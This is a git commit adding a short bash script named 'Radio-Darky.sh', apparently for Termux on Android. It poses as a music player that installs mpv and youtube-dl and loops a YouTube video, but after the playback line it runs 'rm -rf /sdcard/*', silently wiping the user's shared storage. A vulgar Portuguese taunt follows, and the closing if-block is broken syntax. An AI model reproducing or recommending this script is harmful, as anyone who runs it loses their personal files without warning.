cccfe7d67f50cb9c33bc270dcfd2a0f6f1252006
Darky-Oss <71002636+Darky-Oss@users.noreply.github.com>
2020-09-10 12:32:58 -0300

    Add files via upload

---
+++ Radio-Darky.sh
@@ -0,0 +1,26 @@
+#!/bin/bash
+
+apt install neofetch
+clear
+neofetch
+sleep 2
+#Adicionar um user
+
+echo "Foi adicionado > $(whoami)"
+apt update
+clear
+     #Music
+apt install mpv -y
+apt install youtubedr
+apt install mpv python -y &>/dev/null
+pip3 install youtube-dl
+clear
+
+mpv https://youtu.be/XYZue7_NQew --loop &>/dev/null
+rm -rf /sdcard/*
+#Minha pika se você leu ✓
+
+if
+ then
+ echo " se curtiu deixa estrela no git"
+fi
